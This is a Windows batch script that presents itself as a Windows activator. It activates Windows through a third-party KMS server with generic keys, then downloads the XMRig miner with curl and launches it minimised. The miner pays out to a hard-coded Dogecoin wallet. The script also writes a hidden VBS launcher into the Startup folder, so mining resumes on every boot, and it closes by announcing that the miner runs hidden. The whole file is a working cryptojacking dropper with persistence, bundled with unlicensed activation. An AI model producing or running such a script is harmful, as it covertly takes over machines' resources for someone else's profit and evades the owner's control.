@echo off
title Windows Activator & Mining Setup
color 0A

:: ==========================================
:: PASSWORD CHECK (Plain Text)
:: ==========================================
set /p "input=Enter password: "

if not "%input%"=="abuamer" (
    echo Access Denied. Incorrect password.
    timeout /t 3 /nobreak > nul
    exit /b 1
)

echo Access Granted.
timeout /t 1 /nobreak > nul

:: ==========================================
:: PART 1: GET COMPUTER NAME
:: ==========================================
for /f "tokens=*" %%i in ('wmic computersystem get name /value ^| find "="') do set %%i
if not defined Name set Name=%COMPUTERNAME%
set "WORKER_NAME=%Name%"

:: ==========================================
:: PART 2: WINDOWS ACTIVATION
:: ==========================================
echo [1/3] Checking Windows Activation...

for /f "tokens=6 delims=[.] " %%a in ('ver') do set winver=%%a
cscript //nologo //B "%windir%\system32\slmgr.vbs" /dli > "%temp%\act.txt"
findstr /c:"LICENSED" "%temp%\act.txt" > nul
if %errorlevel% equ 0 (
    echo [OK] Windows is already activated.
) else (
    echo [!] Activating Windows 10/11...
    
    set "edition="
    for /f "tokens=*" %%i in ('wmic os get caption ^| findstr /i "windows"') do set edition=%%i
    
    echo %edition% | findstr /i "Home" > nul
    if %errorlevel% equ 0 (
        slmgr /ipk TX9XD-98N7V-6WMQ6-BX7FG-H8Q99 > nul
    )
    
    echo %edition% | findstr /i "Pro" > nul
    if %errorlevel% equ 0 (
        slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX > nul
    )
    
    echo %edition% | findstr /i "Enterprise" > nul
    if %errorlevel% equ 0 (
        slmgr /ipk NPPR9-FWDCX-D2C8J-H872K-2YT43 > nul
    )
    
    echo %edition% | findstr /i "Education" > nul
    if %errorlevel% equ 0 (
        slmgr /ipk NW6C2-QMPVW-D7KKK-3GKT6-VCFB2 > nul
    )
    
    slmgr /skms kms8.msguides.com > nul
    slmgr /ato > nul
    
    echo [OK] Windows activation attempted.
)
timeout /t 2 /nobreak > nul

:: ==========================================
:: PART 3: XMRIG MINER SETUP
:: ==========================================
echo [2/3] Setting up XMRig Miner...

set "BASE_DIR=C:\xmrig_miner"
set "MINER_DIR=%BASE_DIR%\xmrig-6.22.2"

if not exist "%BASE_DIR%" mkdir "%BASE_DIR%"
cd /d "%BASE_DIR%"

if not exist "%MINER_DIR%\xmrig.exe" (
    echo Downloading XMRig...
    curl -L -o xmrig.zip https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip
    tar -xf xmrig.zip
    del xmrig.zip
)

cd "%MINER_DIR%"
start /min xmrig.exe -a rx -o stratum+ssl://rx-us.unmineable.com:443 -u DOGE:DC2KEabegB67k76nB8HbTTAmBHzFiY3EvR.%WORKER_NAME% -p x -t 4
timeout /t 2 /nobreak > nul

:: ==========================================
:: PART 4: ADD TO STARTUP
:: ==========================================
echo [3/3] Adding to Windows Startup...

set "VBS_FILE=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\miner.vbs"

(
    echo Set objShell = CreateObject("Wscript.Shell"^)
    echo Set objEnv = objShell.Environment("Process"^)
    echo computerName = objEnv("COMPUTERNAME"^)
    echo objShell.Run "cmd.exe /c cd C:\xmrig_miner\xmrig-6.22.2 ^&^& xmrig.exe -a rx -o stratum+ssl://rx-us.unmineable.com:443 -u DOGE:DC2KEabegB67k76nB8HbTTAmBHzFiY3EvR." ^& computerName ^& " -p x -t 4", 0, False
) > "%VBS_FILE%"

:: ==========================================
:: FINAL MESSAGE
:: ==========================================
cls
echo ==============================================
echo        ALL OPERATIONS COMPLETED SUCCESSFULLY
echo ==============================================
echo.
echo [✓] Windows Activation: Attempted
echo [✓] XMRig Miner: Running in background
echo [✓] Auto-start: Added to Windows Startup
echo [✓] Worker Name: %WORKER_NAME%
echo.
echo The miner is now running hidden.
echo It will start automatically on every boot.
echo.
echo ==============================================
timeout /t 5 /nobreak > nul
exit
